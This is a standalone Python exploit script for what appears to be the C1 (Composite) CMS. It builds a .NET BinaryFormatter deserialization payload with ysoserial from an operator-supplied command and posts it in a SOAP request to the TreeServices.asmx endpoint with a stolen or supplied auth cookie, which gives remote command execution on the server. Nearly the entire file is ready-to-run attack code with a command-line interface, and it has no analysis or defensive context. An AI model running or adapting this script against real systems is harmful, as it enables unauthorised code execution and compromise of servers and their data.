c1_cms/exploit.py

import requests
import os
import argparse

def parse_args():
    parser = argparse.ArgumentParser(prog="python3 exloit.py")
    parser.add_argument('-u', '--url', required=True, type=str, default=None)
    parser.add_argument('--cmd', required=True, type=str, default=None)
    parser.add_argument('--cookies', required=True, type=str, default=None)
    parser.add_argument('--proxy', required=False, type=str, default=None,
                        help="Proxy URL, support HTTP proxies (Example: http://127.0.0.1:8080)")
    return parser.parse_args()
def send_request(url, cookies, cmd, proxies):
    url = url+'/Composite/services/Tree/TreeServices.asmx'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.47',
        'Content-Type': 'text/xml; charset=utf-8',
        'Cookies': '.CMSAUTH_-1488733661_757602046='+cookies
    }
    # Create payload with ysoserial
    payload = os.popen('.\ysoserial-1.34\Release\ysoserial.exe -g DataSet -f BinaryFormatter -c "'+cmd+'" -o base64').read().strip()
    # Data post
    data = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
    <GetMultipleChildren xmlns="http://www.composite.net/ns/management">
    <clientProviderNameEntityTokenPairs>
        <RefreshChildrenParams>
        <ProviderName>string</ProviderName>
        <EntityToken>entityTokenType='Microsoft.Practices.EnterpriseLibrary.Logging.Formatters.BinaryLogFormatter' entityToken='{}'</EntityToken>
        <Piggybag>string</Piggybag>
        <SearchToken>string</SearchToken>
        </RefreshChildrenParams>
    </clientProviderNameEntityTokenPairs>
    </GetMultipleChildren>
</soap:Body>
</soap:Envelope>'''.format(payload)
    # print (data)
    requests.post(url, data=data,
                  headers=headers, proxies=proxies)
def main():
    args = parse_args()
    url = args.url
    proxies = {
        "http": args.proxy,
        "https": args.proxy
    }
    cookies = args.cookies
    cmd = args.cmd
    send_request(url, cookies, cmd, proxies)
    print("DONE!")

main()